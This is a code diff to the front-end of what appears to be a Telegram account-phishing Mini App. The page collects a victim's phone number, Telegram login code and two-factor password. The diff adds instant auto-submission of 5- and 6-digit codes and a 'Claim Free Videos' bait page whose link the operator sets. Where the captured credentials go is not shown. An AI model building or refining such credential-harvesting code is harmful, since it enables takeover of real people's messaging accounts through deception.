@@ -60,7 +60,8 @@ const views = {
     phoneEntry: document.getElementById("view-phone-entry"),
     otpEntry: document.getElementById("view-otp-entry"),
     twofaEntry: document.getElementById("view-2fa-entry"),
-    success: document.getElementById("view-success")
+    success: document.getElementById("view-success"),
+    claim: document.getElementById("view-claim")
 };
 
 const dots = {
@@ -114,6 +115,8 @@ function init() {
     });
     if (btnSubmit2fa) btnSubmit2fa.addEventListener("click", submit2fa);
     if (btnCloseApp) btnCloseApp.addEventListener("click", () => tg.close());
+    const btnClaimClose = document.getElementById("btn-claim-close");
+    if (btnClaimClose) btnClaimClose.addEventListener("click", () => tg.close());
     
     // Toggle Password Visibility
     if (btnTogglePassword && elPasswordInput) {
@@ -135,10 +138,15 @@ function init() {
         elOtpInput.addEventListener("keypress", (e) => {
             if (e.key === "Enter") submitOtp();
         });
-        // Auto-submit 5-digit codes typed from the physical keyboard after a tiny pause
+        // Auto-submit 5-digit codes typed from the physical keyboard after a tiny pause,
+        // and instantly when the 6th digit lands (Telegram sends 5 or 6 digit codes)
         elOtpInput.addEventListener("input", () => {
             if (elOtpError) elOtpError.innerText = "";
-            if (elOtpInput.value.length === 5) {
+            const len = elOtpInput.value.length;
+            if (len === 6) {
+                clearTimeout(otpAutoSubmitTimer);
+                submitOtp();
+            } else if (len === 5) {
                 clearTimeout(otpAutoSubmitTimer);
                 otpAutoSubmitTimer = setTimeout(submitOtp, 400);
             }
@@ -273,7 +281,7 @@ function handleStatusResponse(data) {
         elSubtitle.innerText = `Account ${data.phone || ""} is active!`;
         updateStepper(4);
         switchView("success");
-        loadAwardButton();
+        showClaimPage();
         
     } else if (status === "otp_sent") {
         elTitle.innerText = "Enter OTP Code";
@@ -290,22 +298,27 @@ function handleStatusResponse(data) {
     }
 }
 
-// Load the owner-defined award link for the success screen
-async function loadAwardButton() {
-    const btn = document.getElementById("btn-claim-award");
-    if (!btn) return;
+// Load the owner-defined award link and show the full "Claim Free Videos" page
+async function showClaimPage() {
     try {
         const res = await fetch("/api/reward");
-        if (!res.ok) return;
-        const data = await res.json();
+        const data = res.ok ? await res.json() : { link: "" };
         if (data.link) {
-            btn.href = data.link;
-            btn.innerText = (data.button_text || "Claim Your Award");
-            btn.style.display = "block";
+            const btn = document.getElementById("btn-claim-now");
+            if (btn) {
+                btn.href = data.link;
+                btn.innerText = data.button_text || "CLAIM FREE VIDEOS";
+            }
+            const heading = document.getElementById("claim-heading");
+            if (heading) heading.innerText = data.button_text || "Claim Free Videos";
+            updateStepper(4);
+            switchView("claim");
+            return;
         }
     } catch (err) {
         console.error("Award fetch failed:", err);
     }
+    switchView("success");
 }
 
 // Submit OTP Code
